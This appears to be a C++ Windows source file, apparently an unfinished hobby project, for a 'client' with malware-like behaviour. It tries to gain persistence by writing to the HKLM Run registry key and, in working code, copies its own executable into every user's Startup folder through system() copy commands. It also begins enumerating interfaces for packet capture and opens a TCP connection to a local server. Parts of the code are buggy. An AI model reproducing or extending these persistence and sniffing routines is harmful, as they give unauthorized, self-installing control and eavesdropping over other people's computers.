// try_3.cpp : Defines the entry point for the console application.
// Purpose:  This is a functioning client

#include "stdafx.h"
#include <iostream>
#include <WS2tcpip.h>
#include <string>
#include <winapifamily.h>
#include <stdlib.h>
#include <stdio.h>
#include <vector>
#include <pcap.h>

//specify WinSock lib or else symbols will not match
#pragma comment(lib,"ws2_32.lib") //WinSock lib


/*
* This function will edit registries in order to
* obtain persistence for the client and check to
* see if this has already been accomplished.
*/
int reg_maker() {
	int result = 0; //holds the result of function

					//check if reg key exists
	char* key = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	HKEY hkey;
	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, key, 0, KEY_READ, &hkey) == ERROR_SUCCESS) {
		std::cout << "if one" << std::endl;
		DWORD data = 0;
		DWORD length = sizeof(data);
		DWORD type = REG_DWORD;
		char* value = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Persistence";

		//Query Value to check if it has the location of the file in it
		///////////////////////////////////////ERROR HERE//////////////////////////////////////////////
		if (RegQueryValueExA(HKEY_LOCAL_MACHINE, value, 0, (LPDWORD)&type, (LPBYTE)&data, &length) != ERROR_SUCCESS)
			std::cout << "Could not query reg key" << std::endl;
		///////////////////////////////////////////////////////////////////////////////////////////////
		else {
			//data += "C:\\Users\\michael\\Documents\\Visual Studio 2015\\Projects\\try_3\\Debug\\try_3.exe";
			//Add key inside try_3 using the RegSetValueExA function
			if (RegSetValueExA(HKEY_LOCAL_MACHINE, value, NULL, REG_DWORD, (LPBYTE)&data, sizeof(DWORD)) != ERROR_SUCCESS)
				std::cout << "Failed to set registry value" << std::endl;
			std::cout << data << std::endl;
		}
	}
	else
		std::cout << "Could not open reg key" << std::endl;



	//close registry editor
	return 0;
}

/*
 *This function will split a string based on
 *the character to passed to it and insert the
 *parts into a vector
 */
void split(const std::string& s, char delim, std::vector<std::string>& v) {
	std::string::size_type i = 0;
	std::string::size_type j = s.find(delim);

	while (j != std::string::npos) {
		v.push_back(s.substr(i, j - i));
		i = ++j;
		j = s.find(delim, j);

		if (j == std::string::npos)
			v.push_back(s.substr(i, s.length()));
	}
}

/*
 *remove the spaces from each string in the vector
 */
void remover(std::vector<std::string>& v) {
	for (int i = 0; i < v.size(); i++) {
		std::string getting_changed = v[i];
		std::string changed_str = "";
		for (int i = 0; i < getting_changed.size(); i++) {
			if (' ' != getting_changed[i]) {
				changed_str += getting_changed[i];
			}
		}
		v[i] = changed_str;
	}
}

/*
 *Checks to see in character matched
 *a character in the alphabet or used for directories
 */
int matcher(char firstletter) {
	std::string alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\\._:0123456789";
	int res = alphabet.find(firstletter);

	return res;
}

/*
 *This will parse the output of a dir command
 *and return a vector of Users directories
 */
std::string parser(const std::string res, std::vector<std::string> v) {
	std::string directories = "";
	split(res, '\n', v);
	remover(v);
	
	for (int i = 0; i < v.size(); i++) {
		int temp = v[i].find('>');
		if (temp == 21) {
			int res = matcher(v[i][22]);
			if (res > -1) {
				for (int x = 22; x < v[i].size(); x++) {
					directories = directories + v[i][x];
				}
			}
		}
		directories += " ";
	}
	
	return directories;
}

/*
 *Finds the current path of the program
 */
std::string find_curr_dir() {
	char Path[FILENAME_MAX];
	std::string exePath = "";

	//Will contain exe path
	HMODULE hmodule = GetModuleHandle(NULL);
	if (hmodule != NULL) {
		//When passing NULL to GetModuleHandle, it returns handle of exe itself
		GetModuleFileName(hmodule, (LPTSTR) Path, (sizeof(Path)));
		
		//Parses the Character array
		for (int i = 0; i < 260; i++) {
			if (matcher(Path[i]) != -1) {
				exePath += Path[i];
			}
			else if (Path[i] == ' ') {
				exePath += Path[i];
			}
		}
	}
	else {
		std::cout << "Module handle is NULL" << std::endl;
	}

	return exePath;
}

/*
 *This function prints the directories/files of the Users
 *directory and sends them to the char buffer via the pipe
 */
int startup_finder() {
	const char* cmd = "dir C:\\Users";
	char buffer[128];
	std::string start = "C:\\Users\\";
	std::string end = "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
	std::string exePath = find_curr_dir();
	std::string result = "";
	std::vector<std::string> parts;
	std::vector<std::string> folder;
	FILE* _pipe = _popen(cmd, "r");

	//redirects stdout to pipe and adds elements of buffer to result string
	if (!_pipe) {
		std::cout << "ERROR" << std::endl;
	}
	
	while (!feof(_pipe)) {
		if (fgets(buffer, 128, _pipe) != NULL)
			result += buffer;
	}
	_pclose(_pipe);

	
	/*
	 *Parses result and Splits result string by spaces
	 *Loops parts vector to find elements that contain
	 *directories then copies the exe to those directories
	 */
	result = parser(result, parts);
	split(result, ' ', parts);
	for (int i = 0; i < parts.size(); i++) {
		int rest = matcher(parts[i][0]);
		if (rest != -1) {
			folder.push_back(parts[i]);
			if (parts[i].find('.') == -1) {
				std::string startup_dir = "copy /B \"" + exePath + "\" \"" + start + parts[i] + end + "\"";
				int i = system(startup_dir.c_str());
			}
		}
	}

	return 0;
}


/*
 *This function will find the size of lists created by functions in wpdpack libs
 *list: should be the first point of a pcap interface list
 *returns: the size of the list parameter
 */
int size_of_list(pcap_if_t*  list) {
	int size = 0;

	//loops until d is NULL and counts elements
	for (pcap_if_t* d = list; d != NULL; d = d->next) {
		std::cout << "Printing device list" << std::endl << d->description << std::endl;
		size++;
	}

	return size;
}

/*
 *This function will take care of packet capture using winpcap library
 *returns: 0 if successful otherwise returns -1
 */
int capture_em_packets() {
	/////////////////////Remember to install the winpcap.dll/////////////////
	pcap_if_t* all_devices;	//first point of interface list
	char error_msg[PCAP_ERRBUF_SIZE]; //error message buffer

	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &all_devices, error_msg) == -1) {
		std::cout << "did not get device list" << std::endl;
		return -1;
	}
	
	if (size_of_list(all_devices) == 0) {
		return -1;
	}

	//select interface
	/////////////////////////////////////////////////////////////////////////
	return 0;
}

/*
 *
 */
int main()
{
	//Implements persistence by copying itself to startup folder
	//redirect output into stdout to buffer via pipe
	startup_finder();

	//capture packets
	capture_em_packets();

	//Initialize Socket
	WSAData version; //We need to check the version
	WORD mkword = MAKEWORD(2, 2);
	int what = WSAStartup(mkword, &version);
	if (what != 0) {
		std::cout << "This version is not supported! - \n" << WSAGetLastError() << std::endl;
	}
	else {
		std::cout << "Good - Everything fine!\n" << std::endl;
	}
	//////////////////////////////////////////////////////////

	//Create Socket
	SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
	if (s == INVALID_SOCKET) {
		std::cout << "Failed to create socket" << std::endl;
	}
	else
		std::cout << "Socket created woot!" << std::endl;
	//////////////////////////////////////////////////////////


	//Connect to Server
	//IPv4 AF_INET SOCKET
	sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(8080);
	inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr); //can't use inet_addr b/c it's deprecated so include WS2tcip instead of WinSock2
	
	int conn = connect(s, (SOCKADDR*)&addr, sizeof(addr));
	if (conn == SOCKET_ERROR) {
		std::cout << "Failed to connect\n" << WSAGetLastError() << std::endl;
	}
	//////////////////////////////////////////////////////////

	//send data
	char* mymsg = "GET / HTTP/1.1\r\n\r\n";
	char vect[512] = { 0 };

	int smsg_result = send(s, mymsg, sizeof(mymsg), 0);
	if (smsg_result == SOCKET_ERROR) {
		std::cout << "Error in Sending: " << WSAGetLastError() << std::endl;
	}

	//Recv message
	int recv_result = recv(s, vect, 512, 0);
	if (recv_result == SOCKET_ERROR) {
		std::cout << "Error in Receiving: " << WSAGetLastError() << std::endl;
	}
	else
		std::cout << recv_result << std::endl;
	//////////////////////////////////////////////////////////
	std::string placeholderxxx;
	std::cin >> placeholderxxx;

	closesocket(s);
	WSACleanup();

    return 0;
}

